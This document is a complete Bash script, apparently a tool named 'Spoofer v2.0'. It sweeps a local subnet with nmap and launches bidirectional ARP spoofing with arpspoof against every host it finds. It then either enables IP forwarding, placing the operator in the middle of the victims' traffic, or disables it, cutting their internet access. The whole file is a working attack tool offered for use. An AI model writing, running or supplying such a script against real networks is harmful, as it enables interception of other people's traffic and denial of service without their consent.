#!/bin/bash

# Script version
VERSION=2.0

# Required packages for script to run
REQUIREMENTS="arpspoof"

# Terminal colors
RED="\033[0;31m"
GREEN="\033[0;32m"
NC="\033[0m"

# Display help
func_help()
{
    echo -e ""
    echo -e " Usage: $0 start|stop connect|disconnect <target-ip[/cidr]> [excluded-ip]"
    echo -e ""
    echo -e "  * connect|disconnect  -> Enable/Disable internet connection on target machine"
    echo -e "  * CIDR is only available from 1 to 32"
    echo -e "  * You can exclude IP Addresses on 4th argument with comma (,) separated"
    echo -e ""
}

# Validate IP Address
func_check_ip()
{
    # Initiate local IP variable
    local IP=$1

    # Initiate the result to be false (1)
    local RESULT=1

    # Check through every IP Address bytes if it is a number or not
    if [[ $IP =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]
    then
        # Split every bytes to an array
        IP=($(echo $IP | tr '.' '\n'))

        # Check every bytes value is in correct format (less than 255) and assign the result to the RESULT variable
        [[ ${IP[0]} -le 255 && ${IP[1]} -le 255 && ${IP[2]} -le 255 && ${IP[3]} -le 255 ]]
        RESULT=$?
    fi

    # Return the result
    return $RESULT
}

# Checking package requirements
func_check_prerequires()
{
    # Assume all packages is installed
    PACKAGE_NOT_INSTALLED=false

    # Loop through each required packages
	for PACKAGE in $REQUIREMENTS
	do
        # Check if requirements is installed with 'hash' command 
        # Exit code should be 0 if it is installed and 1 if it isn't
        if ! hash $PACKAGE 2>/dev/null
        then
            # Display error message
            echo -e "ERR: ${RED}$PACKAGE is not installed!$NC\n"
            # Add package not installed flag
            PACKAGE_NOT_INSTALLED=true
        fi
    done

    # Exit if any of the requirements isn't installed
    [[ $PACKAGE_NOT_INSTALLED == true ]] && exit 1
}

# Do some cleanup
func_cleanup()
{
    echo -e "\n\n   Please wait for the cleanup process to be finished...\n\n"

    # Get all child process PIDs (arpspoof)
    local PIDS=$(jobs -pr)

    # Kill all child process
    [[ ! -z $PIDS ]] && kill $PIDS

    # Wait for all child background process to fully finish
    wait

    # Restore terminal session
    tput rmcup

    # Finally exit
    exit 0
}

# Start the attack :)
func_start_attack()
{
    # Move to another terminal session
    tput smcup

    # Trap func_cleanup function to SIGINT, SIGTERM, and SIGKILL signal
    # to make sure cleanup is called if CTRL+C is fired or script is killed
    trap func_cleanup SIGINT SIGTERM SIGKILL

    clear
    echo -e ""
    echo -e "      +-----+ Spoofer v$VERSION +-----+"
    echo -e ""
    echo -e " +"
    echo -e " | Target IP Address   : $TARGET_NETWORK"
    echo -e " | Excluded IP Address : $(echo $EXCLUDED_IP | tr ',' ' ')"
    echo -e " +"
    echo -e ""

    echo -e "[*] Scanning IP Addresses..."

    # Scan all available IP Address in given network
    SPOOF_TARGETS=$(nmap -sn -n ${TARGET_NETWORK} | grep for | cut -d ' ' -f 5-)

    # Loop through all IP Address found and remove IP that is in the Excluded IP list
    for IP in $(echo "$TARGET_IP $EXCLUDED_IP" | tr ',' ' ')
    do
        SPOOF_TARGETS=$(echo $SPOOF_TARGETS | sed "s/\<$IP\>//g")
    done

    # Oh no!, no target is found
    if [[ $SPOOF_TARGETS == "" ]]
    then
        # Ask if you want to retry
        read -n1 -p "[!] No target found! Retry? [Y/n]: " RETRY

        # Check the given input
        case $RETRY in
            y|Y) func_start_attack ;;
            *) func_cleanup ;;
        esac
    fi

    # List the targets
    echo -ne "[*] Targets found:"
    for IP in $SPOOF_TARGETS
    do
        echo -ne " $IP"
    done

    echo -e ""

    # Block or forward internet access
    if [[ $INET == "connect" ]]
    then
        echo -e "[*] Forwarding internet access..."
        # Enabling IP Forwarding
        sysctl -q net.ipv4.ip_forward=1
    elif [[ $INET == "disconnect" ]]
    then
        echo -e "[*] Dropping internet access..."
        # Disabling IP Forwarding
        sysctl -q net.ipv4.ip_forward=0
    fi

    # Start the ARP Spoofing and print the output
    echo -e "[*] Attack Output:\n"

    for IP in $SPOOF_TARGETS
    do
        arpspoof -t $IP $TARGET_IP &
        arpspoof -t $TARGET_IP $IP &
    done

    # Loop so that the script isn't exit yet :v
    while true; do sleep 1; done
}

# Arpspoof is requiring root access
if [[ $EUID -ne 0 ]] 
then 
    echo -e "\n ERR: You must run this script as root.\n"
    exit 1
fi

INET=$1
TARGET=$2
EXCLUDED_IP=$3

# Call function to check package requirements
func_check_prerequires

# Check argument for internet access
case $INET in
    connect|disconnect) ;;
    *) func_help && exit 1;;
esac

# Check argument for target IP
[[ -z $TARGET ]] && func_help && exit 1

# Check if CIDR is given
if [[ ! -z `echo $TARGET | grep '/'` ]]
then
    # Get the CIDR
    CIDR=$(echo $TARGET | cut -d '/' -f2)
    # Check if the given CIDR is correct
    [[ $CIDR =~ ^[0-9]+$ ]] && [[ $CIDR -gt 32 || $CIDR -lt 1 ]] && echo -e "\n ERR: Invalid CIDR range! Should be 1-32\n" && exit 1
    # Assign the CIDR
    CIDR="/$CIDR"
fi

# Get Target IP Address only
TARGET_IP=$(echo $TARGET | cut -d '/' -f1)

# Append Target IP Address and CIDR 
TARGET_NETWORK="${TARGET_IP}${CIDR}"

# Get your IP Addresses
MY_IP=$(ip -o -4 a | awk '{print $4 }' | cut -d '/' -f1 | grep -v ^127 | tr '\n' ',')

# Add your IP Addresses to the exclusion list so that you don't spoof yourself xD
EXCLUDED_IP="${MY_IP}${EXCLUDED_IP}"

# Loop through all IP Addresses to validate IP Address format
for IP in $(echo "$TARGET_IP $EXCLUDED_IP" | tr ',' ' ')
do
    # Call the function to validate IP Address
    if ! func_check_ip $IP
    then
        echo -e " ERR: Invalid IP Address: $IP"
        # Flag invalid IP Address
        INVALID_IP=true
    fi
done

# If there is an invalid IP Address then exit
[[ ! -z $INVALID_IP ]] && exit 1

# Finally START THE ATTACK!!!
func_start_attack
